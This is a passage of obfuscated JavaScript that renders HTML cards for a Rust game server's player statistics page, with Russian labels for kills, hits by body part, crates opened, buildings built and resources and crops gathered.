span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x196)]?.[_0x314e71(0x1ff)] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Волков</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/wolf.webp\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9['StateDeadAnimal']?.[_0x314e71(0x19b)] || 0x0) + _0x314e71(0x152) + (_0x3b2bf9[_0x314e71(0x196)]?.[_0x314e71(0x22d)] || 0x0) + _0x314e71(0x2bb) + (_0x3b2bf9[_0x314e71(0x196)]?.[_0x314e71(0x1b9)] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Пантер</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/panther.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9['StateDeadAnimal']?.[_0x314e71(0x281)] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Тигров</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/tiger.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x196)]?.[_0x314e71(0x25d)] || 0x0) + _0x314e71(0x23b) + (_0x3b2bf9[_0x314e71(0x196)]?.[_0x314e71(0x149)] || 0x0) + _0x314e71(0x2bc) + (_0x3b2bf9[_0x314e71(0x28e)]?.['head'] || 0x0) + _0x314e71(0x23a) + (_0x3b2bf9[_0x314e71(0x28e)]?.[_0x314e71(0x25b)] || 0x0) + _0x314e71(0x103) + (_0x3b2bf9[_0x314e71(0x28e)]?.['lefthand'] || 0x0) + _0x314e71(0x1b8) + (_0x3b2bf9['StateHitBone']?.[_0x314e71(0x1fa)] || 0x0) + '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hitcount\x20leftleg\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22hitcount-part\x22>Левое\x20бедро</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22hitcount-result\x22>' + (_0x3b2bf9[_0x314e71(0x28e)]?.[_0x314e71(0x165)] || 0x0) + '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hitcount\x20rightleg\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22hitcount-part\x22>Правое\x20бедро</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22hitcount-result\x22>' + (_0x3b2bf9[_0x314e71(0x28e)]?.[_0x314e71(0x153)] || 0x0) + _0x314e71(0x2e2) + (_0x3b2bf9['StateHitBone']?.[_0x314e71(0x2d7)] || 0x0) + '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hitcount\x20rightfoot\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22hitcount-part\x22>Правая\x20нога</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22hitcount-result\x22>' + (_0x3b2bf9[_0x314e71(0x28e)]?.[_0x314e71(0x285)] || 0x0) + _0x314e71(0x163) + (_0x3b2bf9[_0x314e71(0x296)]?.['CrateOpen'] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Открыто\x20ящиков</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/crate.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x296)]?.[_0x314e71(0x11a)] || 0x0) + _0x314e71(0x2d6) + (_0x3b2bf9[_0x314e71(0x296)]?.[_0x314e71(0x168)] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Построено</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/hammer.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9['MiscStats']?.[_0x314e71(0x2d8)] || 0x0) + _0x314e71(0x2ad) + (_0x3b2bf9['PlayerPvpStats']?.[_0x314e71(0x178)] || 0x0) + _0x314e71(0x2a1) + (_0x3b2bf9[_0x314e71(0x2cb)]?.[_0x314e71(0x250)] || 0x0) + _0x314e71(0x267) + (_0x3b2bf9[_0x314e71(0x2cb)]?.[_0x314e71(0x1fc)] || 0x0) + _0x314e71(0x209) + (_0x3b2bf9[_0x314e71(0x2cb)]?.[_0x314e71(0x272)] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>НПЦ</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/npc.webp\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x2cb)]?.[_0x314e71(0x2d9)] || 0x0) + _0x314e71(0x1b0) + (_0x3b2bf9[_0x314e71(0x2cb)]?.['BradleyKill'] || 0x0) + _0x314e71(0xfc) + (_0x3b2bf9[_0x314e71(0x23f)] || 0x0) + _0x314e71(0x255) + (_0x3b2bf9[_0x314e71(0x1e6)]?.['wood'] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Дерева</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/wood.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x1e6)]?.[_0x314e71(0x1ca)] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Камня</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/stones.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x1e6)]?.[_0x314e71(0x270)] || 0x0) + _0x314e71(0x222) + (_0x3b2bf9[_0x314e71(0x1e6)]?.['hq.metal.ore'] || 0x0) + _0x314e71(0x1c9) + (_0x3b2bf9['ResourceGatheringStats']?.['sulfur.ore'] || 0x0) + _0x314e71(0x12b) + (_0x3b2bf9[_0x314e71(0x1e6)]?.[_0x314e71(0x2b2)] || 0x0) + _0x314e71(0x1fe) + (_0x3b2bf9[_0x314e71(0x293)] || 0x0) + _0x314e71(0x2de) + (_0x3b2bf9[_0x314e71(0x19e)]?.[_0x314e71(0x122)] || 0x0) + _0x314e71(0x11c) + (_0x3b2bf9[_0x314e71(0x19e)]?.[_0x314e71(0x117)] || 0x0) + _0x314e71(0xf0) + (_0x3b2bf9[_0x314e71(0x19e)]?.[_0x314e71(0x1c2)] || 0x0) + _0x314e71(0x232) + (_0x3b2bf9[_0x314e71(0x19e)]?.[_0x314e71(0x22a)] || 0x0) + _0x314e71(0x188) + (_0x3b2bf9['CropGrowthStats']?.[_0x314e71(0x1ad)] || 0x0) + _0x314e71(0xfe) + (_0x3b2bf9[_0x314e71(0x19e)]?.[_0x314e71(0x164)] || 0x0) + _0x314e71(0x25c) + (_0x3b2bf9['CropGrowthStats']?.[_0x314e71(0x1d9)] || 0x0) + _0x314e71(0x2b6) + (_0x3b2bf9['CropGrowthStats']?.['yellow.berry'] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Желтных\x20ягод</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/yellow.berry.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x19e)]?.[_0x314e71(0x17f)] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Зеленых\x20ягод</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/green.berry.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x19e)]?.[_0x314e71(0x12f)] || 0x0) + _0x314e71(0x199) + (_0x3b2bf9['CropGrowthStats']?.[_0x314e71(0x154)] || 0x0) + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Пшеницы</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://rustexplore.com/images/130/wheat.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>' + (_0x3b2bf9[_0x314e71(0x19e)]?.[_0x314e71(0x134)] || 0x0) + _0x314e71(0x13a) + (_0x3b2bf9['CropGrowthStats']?.['sunflower'] || 0x0) + _0x314e71(0x16e) + (_0x3b2bf9[_0x314e71(0x151)] || 0x0) + 